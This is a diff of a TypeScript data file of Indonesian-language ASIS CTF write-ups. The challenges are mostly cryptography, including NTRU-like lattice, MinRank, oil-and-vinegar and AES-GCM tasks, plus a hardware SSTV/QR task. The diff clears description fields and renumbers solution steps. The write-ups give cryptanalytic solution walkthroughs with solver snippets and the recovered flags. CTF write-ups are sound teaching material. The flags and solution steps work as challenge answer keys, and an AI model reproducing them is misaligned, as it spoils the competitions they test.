@@ -14,7 +14,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Crypto",
       "ASIS CTF"
     ],
-    "description": "Skema kriptografi pada challenge Fence memiliki struktur yang mirip dengan NTRU.\n\nPublic key $h$ dibentuk dari dua polinom kecil $a$ dan $b$:\n\n$$\nh = b \\cdot a^{-1} \\pmod{x^{128}+1,\\ q}\n$$\n\nSecret $a$ dan $b$ bukan polinom random berkoefisien besar. Keduanya merupakan polinom ternary, sehingga setiap koefisien hanya bernilai:\n\n$$\n-1,\\ 0,\\ 1\n$$\n\ndengan weight:\n\n$$\nw = 80\n$$\n\nKarena:\n\n$$\nh = \\frac{b}{a}\n$$\n\nmaka berlaku relasi:\n\n$$\na \\cdot h = b \\pmod q\n$$\n\nRelasi ini dapat diubah menjadi persoalan pencarian shortest vector pada lattice NTRU.\n\nChallenge juga tidak mengenkripsi flag secara langsung. Terdapat 5 ciphertext. Empat plaintext pertama merupakan random share, sedangkan plaintext kelima merupakan hasil XOR antara seluruh random share dan flag.\n\nSetelah seluruh ciphertext berhasil didekripsi, flag diperoleh melalui:\n\n$$\n\\text{flag} = pt_0 \\oplus pt_1 \\oplus pt_2 \\oplus pt_3 \\oplus pt_4\n$$",
+    "description": "",
     "problemDescription": "Skema kriptografi pada challenge Fence memiliki struktur yang mirip dengan NTRU.\n\nPublic key $h$ dibentuk dari dua polinom kecil $a$ dan $b$:\n\n$$\nh = b \\cdot a^{-1} \\pmod{x^{128}+1,\\ q}\n$$\n\nSecret $a$ dan $b$ bukan polinom random berkoefisien besar. Keduanya merupakan polinom ternary, sehingga setiap koefisien hanya bernilai:\n\n$$\n-1,\\ 0,\\ 1\n$$\n\ndengan weight:\n\n$$\nw = 80\n$$\n\nKarena:\n\n$$\nh = \\frac{b}{a}\n$$\n\nmaka berlaku relasi:\n\n$$\na \\cdot h = b \\pmod q\n$$\n\nRelasi ini dapat diubah menjadi persoalan pencarian shortest vector pada lattice NTRU.\n\nChallenge juga tidak mengenkripsi flag secara langsung. Terdapat 5 ciphertext. Empat plaintext pertama merupakan random share, sedangkan plaintext kelima merupakan hasil XOR antara seluruh random share dan flag.\n\nSetelah seluruh ciphertext berhasil didekripsi, flag diperoleh melalui:\n\n$$\n\\text{flag} = pt_0 \\oplus pt_1 \\oplus pt_2 \\oplus pt_3 \\oplus pt_4\n$$",
     "tools": [
       "Python 3",
@@ -94,7 +94,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Crypto",
       "ASIS CTF"
     ],
-    "description": "Server memberi oracle untuk fungsi numerik rahasia. Setiap ronde punya parameter baru:\n\n```python\ncoupling_tensors = np.random.uniform(0.5, 2.0, size=(3, 4, 4))\nobservable_vectors = np.random.uniform(0.5, 2.0, size=(3, 4))\n```\n\nTotal parameter rahasia:\n\n```text\nA = 3 * 4 * 4 = 48\nB = 3 * 4     = 12\nTotal         = 60 parameter\n```\n\nKita boleh query oracle sampai 1200 kali per ronde. Karena modelnya cuma punya 60 parameter real, cukup ambil sekitar 96 sampel, fit parameternya dengan least squares, lalu pakai model lokal buat menjawab challenge.",
+    "description": "",
     "problemDescription": "Server memberi oracle untuk fungsi numerik rahasia. Setiap ronde punya parameter baru:\n\n```python\ncoupling_tensors = np.random.uniform(0.5, 2.0, size=(3, 4, 4))\nobservable_vectors = np.random.uniform(0.5, 2.0, size=(3, 4))\n```\n\nTotal parameter rahasia:\n\n```text\nA = 3 * 4 * 4 = 48\nB = 3 * 4     = 12\nTotal         = 60 parameter\n```\n\nKita boleh query oracle sampai 1200 kali per ronde. Karena modelnya cuma punya 60 parameter real, cukup ambil sekitar 96 sampel, fit parameternya dengan least squares, lalu pakai model lokal buat menjawab challenge.",
     "tools": [
       "Python 3",
@@ -161,23 +161,23 @@ export const asisCtfWriteups: WriteUp[] = [
     "analysis": "# Less is more Writeup\n\nTarget file berisi `challenge.py` dan `flag.enc`. Format `flag.enc` memakai magic `ASIS117\\x04`, panjang big-endian, lalu body zlib + pickle. Setelah dibuka, isinya berisi:\n\n- parameter publik `P, N, K, T, W`\n- matriks dasar `g`\n- 17 matriks publik\n- kumpulan record signature\n- `sealed`, yaitu flag yang di-XOR dengan pad dari `SHAKE256(b'o' + pack_key(secret_key))`\n\nKuncinya ada di record yang tidak normal. Pada signing normal, leaf yang kena challenge tidak dibuka. Di sini ada kondisi:\n\n```python\nif int.from_bytes(hashlib.sha256(b'v' + root).digest()[:2], 'big') % 100 < 72:\n    f[target] = self.state[target]\n```\n\nKalau `target` sedang kena challenge tetapi `f[target]` berubah menjadi 0, seed leaf tersebut ikut terbuka di path. Respons untuk leaf itu tetap ada di `rsp`. Ini membocorkan subset dari inverse permutation milik salah satu secret key.",
     "solution": [
       {
-        "title": "1. Parsing capture",
+        "title": "Parsing capture",
         "content": "`flag.enc` dibaca dengan cara:\n\n```python\nraw = open('flag.enc', 'rb').read()\nln = struct.unpack('>I', raw[8:12])[0]\ndata = pickle.loads(zlib.decompress(raw[12:12 + ln]))\n```\n\nJumlah record pada capture ini adalah **5963**. Flag terenkripsi panjangnya **54 byte**."
       },
       {
-        "title": "2. Mendeteksi record bocor",
+        "title": "Mendeteksi record bocor",
         "content": "Challenge vector dihitung ulang dari `cmt`, `salt`, dan `msg` memakai fungsi `chal()`. Posisi target didapat dari serial message:\n\n```python\ntarget = (37 * serial + 11) % T\n```\n\nToken node pada path bisa dibalik karena hanya XOR dengan mask dari commitment:\n\n```python\nnode = token ^ (sha256(b'm' + cmt)[:2] & 1023)\n```\n\nUntuk setiap record, ada dua kemungkinan state:\n\n- `f` sama dengan indikator challenge normal.\n- `f[target]` dibalik.\n\nSolver menghitung cover tree untuk dua kemungkinan itu. Kalau hanya satu cover cocok dengan node-node di path, record dianggap bersih. Kalau dua-duanya cocok, record dilewati. Ini lebih aman daripada sok yakin, kegiatan favorit bug.\n\nRecord bocor terjadi saat:\n\n```python\nb[target] != 0 and f[target] == 0\n```\n\nDari cover node yang memuat target, seed leaf diturunkan ulang dengan hash kiri atau kanan sampai mencapai leaf target. Lalu label-nya dicocokkan ke `rsp`:\n\n```python\nlabel = sha256(b't' + cmt + leaf_seed)[:8]\n```\n\nDari situ kita mendapatkan:\n\n- `V = take(leaf_seed, b'n', N, K)`\n- `S` = response bitset\n- kelas `key b[target] - 1`"
       },
       {
-        "title": "3. Recover permutation",
+        "title": "Recover permutation",
         "content": "Untuk satu hit valid, signature membocorkan relasi:\n\n```\nS = { q[j] | j in V }\n```\n\n`q` adalah inverse permutation dari key untuk kelas tersebut.\n\nSetiap kolom `j` punya pola keanggotaan pada semua subset `V`. Posisi `q[j]` punya pola keanggotaan yang sama pada semua subset `S`. Jadi permutation bisa dipulihkan dengan mencocokkan bit-signature.\n\nContoh idenya:\n\n```python\nsig_v[j] = bitmask record ketika j muncul di V\nsig_s[i] = bitmask record ketika i muncul di S\nq[j] = i jika sig_v[j] == sig_s[i]\n```\n\nSatu respons memang bisa dirusak oleh bagian ini:\n\n```python\nif int.from_bytes(hashlib.sha256(b'w' + root).digest()[:2], 'big') % 100 < 14:\n    rsp[j][1] = bits(take(root, b'z', N, K))\n```\n\nPada data ini, class 2 perlu membuang satu outlier, yaitu serial 5175. Setelah outlier dibuang, semua permutation 548 elemen pulih penuh."
       },
       {
-        "title": "4. Mencari matriks publik yang cocok",
+        "title": "Mencari matriks publik yang cocok",
         "content": "Ada 17 public matrix, tetapi hanya 7 yang real. Setelah permutation `p` didapat untuk setiap class, solver mencocokkannya dengan semua public matrix.\n\nMatriks publik berasal dari:\n\n```\npublic = red(g[:, p[j]] * inv(d[j]))\n```\n\nKarena `red()` hanya operasi baris, dua generator matrix tersebut row-equivalent dengan perbedaan scaling kolom. Untuk basis kolom pertama K, solver menghitung koordinat kolom sisa:\n\n```\nC = inv(G_basis) * G_other\nD = inv(A_basis) * A_other\n```\n\nUntuk public matrix yang benar, berlaku:\n\n```\nD[r, c] / C[r, c] = lambda_c / lambda_basis_r\n```\n\nArtinya matrix rasio element-wise punya struktur rank-1. Public matrix yang benar memberi skor penuh `274 * 274 = 75076`. Yang salah hanya sekitar 600-an kecocokan acak.\n\nSlot publik real yang ditemukan:\n\n| Class | Slot |\n|-------|------|\n| 0     | 0    |\n| 1     | 4    |\n| 2     | 14   |\n| 3     | 2    |\n| 4     | 6    |\n| 5     | 16   |\n| 6     | 12   |\n\nDari rasio itu, solver memulihkan `d` dalam bentuk normalisasi yang sama dengan `pack_key()`, yaitu `d[j] / d[0]`."
       },
       {
-        "title": "5. Decrypt flag",
+        "title": "Decrypt flag",
         "content": "Setelah `p` dan `d` untuk 7 key real pulih, key dipack ulang dengan format yang sama:\n\n```python\nfor p, d in keys:\n    for x in p:\n        out += x.to_bytes(2, 'little')\n    for x in d:\n        out += x.to_bytes(2, 'little')\n```\n\nPad dibuat ulang:\n\n```python\npad = shake_256(b'o' + pack_key(keys)).digest(len(sealed))\nflag = sealed ^ pad\n```\n\nHasilnya:\n\n```\nASIS{iZ_1tEr4t10n_5k1p_m4ke5_n0_1nn0c3nT_r3sPonse!!!?}\n```"
       },
       {
@@ -202,7 +202,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Crypto",
       "ASIS CTF"
     ],
-    "description": "Challenge ini memberikan dua file:\n\n* `linchan.py` — generator challenge.\n* `output.txt` — data publik yang berisi ciphertext dan kumpulan subspace matriks.\n\nTujuan akhirnya adalah mendapatkan key ChaCha20-Poly1305 yang digunakan untuk mengenkripsi flag.\n\nDari source terlihat bahwa challenge bekerja sepenuhnya di atas matriks \\(32\\times32\\) pada \\(GF(2)\\). Parameter utamanya adalah:\n\n```python\n_n = 32\n_l = ((16, 2), (17, 2), (18, 1))\n_d = 34\n_z = b\"linchan/v2\"\n```\n\nArtinya terdapat lima secret matrix secara total:\n\n* 2 secret untuk \\(m=16\\)\n* 2 secret untuk \\(m=17\\)\n* 1 secret untuk \\(m=18\\)\n\nMasing-masing secret merupakan matriks invertible \\(32\\times32\\).\n\n---",
+    "description": "",
     "problemDescription": "Challenge ini memberikan dua file:\n\n* `linchan.py` — generator challenge.\n* `output.txt` — data publik yang berisi ciphertext dan kumpulan subspace matriks.\n\nTujuan akhirnya adalah mendapatkan key ChaCha20-Poly1305 yang digunakan untuk mengenkripsi flag.\n\nDari source terlihat bahwa challenge bekerja sepenuhnya di atas matriks \\(32\\times32\\) pada \\(GF(2)\\). Parameter utamanya adalah:\n\n```python\n_n = 32\n_l = ((16, 2), (17, 2), (18, 1))\n_d = 34\n_z = b\"linchan/v2\"\n```\n\nArtinya terdapat lima secret matrix secara total:\n\n* 2 secret untuk \\(m=16\\)\n* 2 secret untuk \\(m=17\\)\n* 1 secret untuk \\(m=18\\)\n\nMasing-masing secret merupakan matriks invertible \\(32\\times32\\).\n\n---",
     "tools": [
       "Python 3",
@@ -211,43 +211,43 @@ export const asisCtfWriteups: WriteUp[] = [
     "analysis": "# ASIS CTF — Linchan Write-up",
     "solution": [
       {
-        "title": "1. Matrix Representation",
+        "title": "Matrix Representation",
         "content": "Setiap row matriks disimpan sebagai integer 32-bit.\n\nOperasi penjumlahan matriks hanyalah XOR:\n\n```python\ndef _a(A, B):\n    return [x ^ y for x, y in zip(A, B)]\n```\n\nSedangkan `_m(A,B)` melakukan perkalian matriks pada \\(GF(2)\\).\n\nChallenge juga menyediakan transpose dan inverse matrix:\n\n```python\n_t(A)\n_i(A)\n```\n\nJadi seluruh konstruksi bisa dipandang sebagai linear algebra di \\(GF(2)\\).\n\n---"
       },
       {
-        "title": "2. Hidden Rank-25 Matrices",
+        "title": "Hidden Rank-25 Matrices",
         "content": "Bagian paling penting pertama adalah fungsi:\n\n```python\ndef _h():\n    while True:\n        A = [secrets.randbits(25) for _ in range(_n)]\n        B = [secrets.randbits(_n) for _ in range(25)]\n        X = _m(A, B)\n        if _r(X) == 25:\n            return X\n```\n\nMatrix `A` mempunyai ukuran \\(32\\times25\\), sedangkan `B` berukuran \\(25\\times32\\).\n\nKarena:\n\n$$\nX=A\\cdot B\n$$\n\nmaka:\n\n$$\n\\operatorname{rank}(X)\\le25\n$$\n\nGenerator bahkan memastikan:\n\n$$\n\\operatorname{rank}(X)=25\n$$\n\ndengan pengecekan `_r(X) == 25`.\n\nSelanjutnya perhatikan:\n\n```python\ndef _b(m, q=False):\n    B = [_h(), _h()] if q else []\n```\n\nJika `q=True`, sebuah box selalu dimulai dengan **dua matriks rank 25**.\n\nSetelah itu box diisi matriks random sampai dimensinya menjadi `m`.\n\nIni merupakan distinguisher utama challenge.\n\n---"
       },
       {
-        "title": "3. Obfuscation Tidak Menghilangkan Low-Rank Element",
+        "title": "Obfuscation Tidak Menghilangkan Low-Rank Element",
         "content": "Sebelum box diberikan ke player, generator menjalankan:\n\n```python\ndef _o(B):\n    B = [_c(x, B) for x in _u(len(B))]\n    return [_t(A) for A in B] if secrets.randbits(1) else B\n```\n\n`_u(m)` menghasilkan basis invertible dari \\(GF(2)^m\\), lalu `_c()` membuat linear combination dari basis matrix sebelumnya.\n\nJadi `_o()` sebenarnya hanya melakukan:\n\n1. change of basis pada matrix subspace;\n2. optional transpose untuk seluruh subspace.\n\nHal pentingnya:\n\n> Change of basis tidak mengubah subspace.\n\nDengan demikian dua matriks rank-25 tadi masih berada di dalam span box meskipun tidak lagi terlihat langsung sebagai elemen basis yang diberikan.\n\nKarena \\(m\\) hanya 16, 17, atau 18, seluruh elemen subspace masih bisa dienumerasi:\n\n$$\n2^{16}=65536\n$$\n\n$$\n2^{17}=131072\n$$\n\n$$\n2^{18}=262144\n$$\n\nIni sangat kecil untuk brute force.\n\n---"
       },
       {
-        "title": "4. MinRank Scan",
+        "title": "MinRank Scan",
         "content": "Untuk setiap box, saya enumerasi semua nonzero linear combination:\n\n$$\nX=\\sum_i c_i B_i,\\qquad c_i\\in GF(2)\n$$\n\nlalu menghitung:\n\n$$\n\\operatorname{rank}(X)\n$$\n\nJika ditemukan:\n\n$$\n\\operatorname{rank}(X)\\le25\n$$\n\nbox tersebut ditandai sebagai planted box.\n\nUntuk mempercepat enumerasi, solver menggunakan Gray code. Jadi dari combination sebelumnya ke berikutnya hanya satu basis matrix yang berubah dan state cukup di-XOR satu kali.\n\nPseudo-code:\n\n```text\ncur = 0\n\nfor mask in gray_code(1 .. 2^m-1):\n    changed = previous_mask XOR mask\n    cur ^= basis[index(changed)]\n\n    if rank(cur) <= 25:\n        save(mask)\n```\n\nDecoy dibentuk dari matriks random:\n\n```python\nB.append((m, _o(_b(m))))\n```\n\nsementara planted box berasal dari `_b(m, True)`.\n\nUntuk instance ini, scan mendapatkan tepat 10 suspicious boxes:\n\n```text\n[1, 32, 44, 47, 49, 60, 82, 86, 92, 106]\n```\n\nIni sesuai ekspektasi karena terdapat 5 secret dan setiap secret menghasilkan dua box.\n\n---"
       },
       {
-        "title": "5. Hubungan Antar Planted Box",
+        "title": "Hubungan Antar Planted Box",
         "content": "Sekarang lihat bagaimana planted pair dibuat:\n\n```python\nC, S = _b(m, True), _g()\nT = _i(S)\nD = [_m(_m(S, A), T) for A in C]\n```\n\nKarena `T = S^-1`, maka setiap matrix pada box kedua berbentuk:\n\n$$\nD_i=S C_i S^{-1}\n$$\n\nJadi dua subspace tersebut saling **conjugate**.\n\nInilah properti kedua yang digunakan untuk memasangkan 10 special boxes menjadi 5 pasangan.\n\nHasil pairing:\n\n```text\nm=16: box 49 <-> 60\nm=16: box 82 <-> 86\n\nm=17: box 1  <-> 92\nm=17: box 47 <-> 106\n\nm=18: box 32 <-> 44\n```\n\n---"
       },
       {
-        "title": "6. Recover Secret Conjugator",
+        "title": "Recover Secret Conjugator",
         "content": "Misalkan dua low-rank matrix yang bersesuaian adalah:\n\n$$\nA\n$$\n\ndan:\n\n$$\nB=SAS^{-1}\n$$\n\nDaripada langsung menyelesaikan persamaan nonlinear tersebut, kalikan kanan dengan \\(S\\):\n\n$$\nBS=SA\n$$\n\nSekarang persamaannya **linear terhadap seluruh bit dari \\(S\\)**.\n\nKarena \\(S\\) adalah matrix \\(32\\times32\\), terdapat:\n\n$$\n32^2=1024\n$$\n\nunknown bits.\n\nUntuk setiap pasangan elemen \\(i,j\\):\n\n$$\n(BS)_{ij}=(SA)_{ij}\n$$\n\nmemberikan satu linear equation di \\(GF(2)\\).\n\nSatu pasangan matriks memberikan hingga 1024 persamaan.\n\nSaya menggunakan dua low-rank matrix sekaligus:\n\n$$\nB_1S=SA_1\n$$\n\n$$\nB_2S=SA_2\n$$\n\ndan menggabungkan kedua linear system tersebut.\n\nPada planted pair yang benar, kernel akhirnya memiliki dimension 1.\n\nKarena field-nya adalah \\(GF(2)\\), satu-satunya nonzero scalar adalah 1. Akibatnya nonzero vector di kernel langsung memberikan matrix conjugator yang kita cari.\n\nSetelah reshape 1024 bit menjadi matrix \\(32\\times32\\), solver memastikan:\n\n```text\nrank(S) = 32\n```\n\ndan memverifikasi kembali:\n\n$$\nS A_i S^{-1}=B_i\n$$\n\n---"
       },
       {
-        "title": "7. Handling Transpose and Generator Ordering",
+        "title": "Handling Transpose and Generator Ordering",
         "content": "Ada dua gangguan tambahan.\n\nPertama, `_o()` dapat mentranspose seluruh box:\n\n```python\nreturn [_t(A) for A in B] if secrets.randbits(1) else B\n```\n\nKedua, dua hidden rank-25 generators tidak mempunyai ordering yang dapat dipercaya setelah basis transformation.\n\nKarena hanya ada dua generator, solver cukup mencoba kemungkinan kecil berikut:\n\n```text\ntranspose / no transpose\ngenerator order (0,1) / (1,0)\n```\n\nSetiap kandidat kemudian diuji dengan equation conjugacy.\n\nFalse positive akan gagal karena linear system tidak menghasilkan invertible conjugator yang valid.\n\n---"
       },
       {
-        "title": "8. Why Recovering an Equivalent Secret Is Enough",
+        "title": "Why Recovering an Equivalent Secret Is Enough",
         "content": "Menariknya, kita tidak harus mendapatkan orientasi `S` yang persis sama dengan generator.\n\nKey derivation menggunakan:\n\n```python\ndef _f(S):\n    T = _i(S)\n    return min(_p(S), _p(T), _p(_t(S)), _p(_t(T)))\n```\n\nJadi generator menganggap empat representasi berikut ekuivalen:\n\n$$\nS\n$$\n\n$$\nS^{-1}\n$$\n\n$$\nS^T\n$$\n\n$$\n(S^{-1})^T\n$$\n\ndan memilih serialized value terkecil.\n\nIni sangat membantu karena transpose pada `_o()` tidak perlu dibalik sampai mengetahui orientasi original dengan pasti.\n\nSelama conjugator yang ditemukan termasuk dalam equivalence class tersebut, canonical representation akan sama.\n\n---"
       },
       {
-        "title": "9. Key Derivation",
+        "title": "Key Derivation",
         "content": "Setelah semua lima secret ditemukan, challenge melakukan:\n\n```python\nX = b\"\".join(sorted(_f(A) for A in S))\nreturn hashlib.shake_256(\n    b\"linchan-v2/key\\0\" + X\n).digest(32)\n```\n\nJadi solver melakukan hal yang sama:\n\n1. canonicalize kelima secret;\n2. sort byte representation;\n3. concatenate;\n4. SHAKE-256;\n5. ambil 32 byte.\n\nRecovered key:\n\n```text\nc79d930f6691caace9686711a0d8b9e9590a16831b935f14fb5beb6a5c56b638\n```\n\nKey derivation ini sesuai fungsi `_k()` pada challenge.\n\n---"
       },
       {
-        "title": "10. Decrypt Flag",
+        "title": "Decrypt Flag",
         "content": "Ciphertext dibuat sebagai:\n\n```python\nnonce = secrets.token_bytes(12)\n\nct = nonce + ChaCha20Poly1305(_k(K)).encrypt(\n    nonce,\n    msg,\n    b\"linchan/v2\"\n)\n```\n\nKemudian disimpan sebagai Base85 di JSON challenge.\n\nJadi setelah key ditemukan:\n\n```python\nct = base64.b85decode(obj[\"ct\"])\n\nnonce = ct[:12]\nciphertext = ct[12:]\n\nflag = ChaCha20Poly1305(key).decrypt(\n    nonce,\n    ciphertext,\n    b\"linchan/v2\"\n)\n```\n\nHasilnya:\n\n```text\nASIS{Mr.__L1nChaN_h3aViEr__GFq2__ma7ch!nG_9aUntl3t!!?}\n```\n\n---\n\n# Exploit Summary\n\nKeseluruhan serangan bisa dirangkum menjadi:\n\n```text\noutput.txt\n    |\n    v\ndecode Base85 + zlib + JSON\n    |\n    v\nenumerate every element of each m-dimensional matrix subspace\n    |\n    v\nfind matrices with rank <= 25\n    |\n    v\nidentify 10 planted boxes\n    |\n    v\npair boxes having equal m through simultaneous conjugacy\n    |\n    v\nsolve B*S = S*A over GF(2)\n    |\n    v\nrecover 5 invertible conjugators\n    |\n    v\ncanonicalize S, S^-1, S^T, S^-T\n    |\n    v\nSHAKE-256 key derivation\n    |\n    v\nChaCha20-Poly1305 decrypt\n    |\n    v\nFLAG\n```\n\n---"
       },
       {
@@ -285,23 +285,23 @@ export const asisCtfWriteups: WriteUp[] = [
     "analysis": "# Mario Writeup\n\nFile berisi dua artefak utama:\n\n- `mario.py`, generator challenge.\n- `output.txt`, payload publik hasil eksekusi generator.\n\nParameter yang dipakai:\n\n```\nn = 96\nm = 72\nd = 24\ns = 64\nfield = GF(16), modulus x^4 + x + 1\n```\n\nFlag dienkripsi dengan AES-GCM. Key AES tidak langsung ada di output. Key dibuat dari `row_reduce(public_oil_basis)`, lalu masuk ke HKDF dengan context `MARIO`.\n\nTargetnya berarti jelas: pulihkan `public_oil_basis`, lakukan row reduction yang sama, turunkan key, lalu decrypt ciphertext.",
     "solution": [
       {
-        "title": "1. Bentuk central map",
+        "title": "Bentuk central map",
         "content": "Fungsi `oil_embed()` membentuk vektor 96 elemen dari input 24 elemen:\n\n```python\ny[0:v] = K*x\ny[v:] = x\n```\n\nJadi ada subspace rahasia berdimensi 24. Ini yang disebut oil subspace.\n\nFungsi `build_public_map()` membuat 72 quadratic form. Koefisien oil-oil disetel agar semua polynomial bernilai nol pada oil subspace. Setelah itu semua koordinat diacak dengan `monomial_scramble()`, yaitu permutasi koordinat plus scaling nonzero di GF(16).\n\nEfek akhirnya:\n\n```\npublic_oil_basis = transformed oil basis\nA = quadratic forms yang vanish pada public_oil_basis\n```\n\nKalau punya basis subspace itu, key langsung bisa dihitung."
       },
       {
-        "title": "2. Kebocoran dari reports",
+        "title": "Kebocoran dari reports",
         "content": "Bagian penting ada di pembuatan `reports`:\n\n```python\noil_vec = oil_embed(k_mat, r(d))\nmask = secrets.randbelow(15) + 1\nreports.append(vec_add(oil_vec, vec_scale(g, mask)))\n```\n\nSetelah transformasi publik, bentuknya tetap sama secara linear:\n\n```\nB_i = u_i + a_i*g\n```\n\nDengan:\n\n- `u_i` berada pada oil subspace.\n- `a_i` adalah scalar nonzero di GF(16).\n- `g` adalah satu arah tambahan yang sama untuk semua report.\n\nJadi 64 report tidak acak penuh di ruang 96 dimensi. Semuanya berada di ruang kecil:\n\n```\nO + <g>\n```\n\nDimensinya maksimal 25. Ini titik bocornya."
       },
       {
-        "title": "3. Menghapus arah g",
+        "title": "Menghapus arah g",
         "content": "Ambil dua report:\n\n```\nB_i = u_i + a_i*g\nB_j = u_j + a_j*g\n```\n\nGabungkan dengan scalar `c`:\n\n```\nB_i + c*B_j = (u_i + c*u_j) + (a_i + c*a_j)*g\n```\n\nKarena field-nya karakteristik 2, pengurangan sama dengan penjumlahan. Ada satu `c` nonzero yang membuat:\n\n```\na_i + c*a_j = 0\n```\n\nSaat itu:\n\n```\nB_i + c*B_j = u_i + c*u_j\n```\n\nVektor hasilnya berada murni di oil subspace.\n\nKita tidak tahu `a_i` dan `a_j`, tapi GF(16) hanya punya 15 scalar nonzero. Jadi brute force `c = 1..15` cukup.\n\nUntuk mengecek apakah kandidat masuk oil subspace, evaluasi semua quadratic form publik. Kandidat valid kalau semuanya menghasilkan nol:\n\n```python\nif all(F(candidate) == 0 for F in A):\n    candidate adalah oil vector\n```\n\nDengan satu report sebagai referensi, 24 vektor independen sudah cukup untuk mendapatkan basis oil subspace."
       },
       {
-        "title": "4. Rebuild key",
+        "title": "Rebuild key",
         "content": "Setelah 24 vektor oil terkumpul, solver menjalankan row reduction yang sama dengan `mario.py`.\n\nMaterial key dibuat dari semua elemen RREF:\n\n```python\nmaterial = bytes(x for row in row_reduce(oil_basis) for x in row)\n```\n\nLalu HKDF:\n\n```python\nkey = HKDF(material, 32, salt, SHA256, context=b\"MARIO\")\n```\n\nSolver memakai implementasi HKDF-SHA256 manual agar tidak tergantung penuh pada PyCryptodome. Untuk AES-GCM, solver mencoba PyCryptodome dulu. Kalau tidak ada, fallback ke `cryptography`."
       },
       {
-        "title": "5. Decrypt",
+        "title": "Decrypt",
         "content": "Payload `C` berisi:\n\n```\nsalt\nnonce\nciphertext || tag\n```\n\nAAD yang dipakai AES-GCM adalah:\n\n```\nMARIO\n```\n\nSetelah key benar, tag valid dan plaintext keluar:\n\n```\nASIS{MARY0___grOe8n3r___8aSi5_chA1L3n9e_Mas7eR3d_r3A1Ly?!!!}\n```"
       },
       {
@@ -330,7 +330,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Crypto",
       "ASIS CTF"
     ],
-    "description": "Challenge **Pancake** memberikan sebuah file Python `pancake.py` dan output `challenge.json`. Program ini membangun skema enkripsi berbasis AES-GCM dengan beberapa lapisan derivasi kunci. Dari deskripsi challenge, petunjuk utama ada pada istilah *key derivation layers* dan *leaking keystreams*. Artinya, kemungkinan besar celahnya bukan pada AES secara langsung, tetapi pada cara nonce, state, atau key stream dihasilkan.\n\nPada source code, parameter penting yang digunakan adalah ukuran blok 128-bit, nilai `DEFAULT_DROP = 32`, dan `NONCE_BITS = 96`. Artinya, hanya 96 bit bagian atas dari blok yang dianggap sebagai nonce state, sedangkan 32 bit bawah digunakan sebagai bagian yang dibuang atau dicari collision-nya.\n\nFlag terenkripsi disimpan pada field `y`, sedangkan field `z` berisi *sealed ticket* yang menyimpan sample terenkripsi. Public challenge juga memberikan hint seed, nonce, associated data, known plaintext berupa 128 byte nol, ciphertext flag, dan sealed sample.",
+    "description": "",
     "problemDescription": "Challenge **Pancake** memberikan sebuah file Python `pancake.py` dan output `challenge.json`. Program ini membangun skema enkripsi berbasis AES-GCM dengan beberapa lapisan derivasi kunci. Dari deskripsi challenge, petunjuk utama ada pada istilah *key derivation layers* dan *leaking keystreams*. Artinya, kemungkinan besar celahnya bukan pada AES secara langsung, tetapi pada cara nonce, state, atau key stream dihasilkan.\n\nPada source code, parameter penting yang digunakan adalah ukuran blok 128-bit, nilai `DEFAULT_DROP = 32`, dan `NONCE_BITS = 96`. Artinya, hanya 96 bit bagian atas dari blok yang dianggap sebagai nonce state, sedangkan 32 bit bawah digunakan sebagai bagian yang dibuang atau dicari collision-nya.\n\nFlag terenkripsi disimpan pada field `y`, sedangkan field `z` berisi *sealed ticket* yang menyimpan sample terenkripsi. Public challenge juga memberikan hint seed, nonce, associated data, known plaintext berupa 128 byte nol, ciphertext flag, dan sealed sample.",
     "tools": [
       "Python 3",
@@ -384,7 +384,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Crypto",
       "ASIS CTF"
     ],
-    "description": "Challenge ini berupa crypto-web service. Aplikasi membuat secret random per session, lalu endpoint `/download` memberikan file `secret.enc` yang berisi secret tersebut dalam bentuk terenkripsi.\n\nTargetnya bukan brute force secret, karena secret panjangnya 28–32 karakter dari alfabet huruf dan angka. Jalur solvenya adalah membongkar format `secret.enc`, recover secret vector kecil dari transcript Sultan, derive stream key, decrypt secret string, lalu submit ke `/api/verify` untuk mendapat flag.\n\nFlag valid:\n\n```\nASIS{cORrup7_qu0ruM_rEu5e_!n_l4sT_ASIS_CTF!!}\n```",
+    "description": "",
     "problemDescription": "Challenge ini berupa crypto-web service. Aplikasi membuat secret random per session, lalu endpoint `/download` memberikan file `secret.enc` yang berisi secret tersebut dalam bentuk terenkripsi.\n\nTargetnya bukan brute force secret, karena secret panjangnya 28–32 karakter dari alfabet huruf dan angka. Jalur solvenya adalah membongkar format `secret.enc`, recover secret vector kecil dari transcript Sultan, derive stream key, decrypt secret string, lalu submit ke `/api/verify` untuk mendapat flag.\n\nFlag valid:\n\n```\nASIS{cORrup7_qu0ruM_rEu5e_!n_l4sT_ASIS_CTF!!}\n```",
     "tools": [
       "Python 3",
@@ -442,7 +442,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Hardware",
       "ASIS CTF"
     ],
-    "description": "Artefak challenge berupa `challenge.raw.xz`. Setelah diekstrak, isinya adalah sampel IQ complex64. Bagian real-nya membentuk audio 48 kHz jika diambil setiap 5 sampel dari stream 240 kHz. Audio tersebut berisi beberapa transmisi SSTV Robot36.\n\nIsi gambar SSTV bukan flag langsung. Gambar membawa potongan QR yang rusak. Potongan ini perlu disusun ulang dari empat strip yang muncul di transmisi. Finder pattern kiri atas hilang, jadi QR harus diperbaiki sedikit sebelum didecode.\n\nFlag yang keluar dari QR:\n\n```\nASIS{3V3RY_W4V3_C4RR13S_4_53CR3T}\n```",
+    "description": "",
     "problemDescription": "Artefak challenge berupa `challenge.raw.xz`. Setelah diekstrak, isinya adalah sampel IQ complex64. Bagian real-nya membentuk audio 48 kHz jika diambil setiap 5 sampel dari stream 240 kHz. Audio tersebut berisi beberapa transmisi SSTV Robot36.\n\nIsi gambar SSTV bukan flag langsung. Gambar membawa potongan QR yang rusak. Potongan ini perlu disusun ulang dari empat strip yang muncul di transmisi. Finder pattern kiri atas hilang, jadi QR harus diperbaiki sedikit sebelum didecode.\n\nFlag yang keluar dari QR:\n\n```\nASIS{3V3RY_W4V3_C4RR13S_4_53CR3T}\n```",
     "tools": [
       "Python 3",
@@ -492,7 +492,7 @@ export const asisCtfWriteups: WriteUp[] = [
       "Pwn",
       "ASIS CTF"
     ],
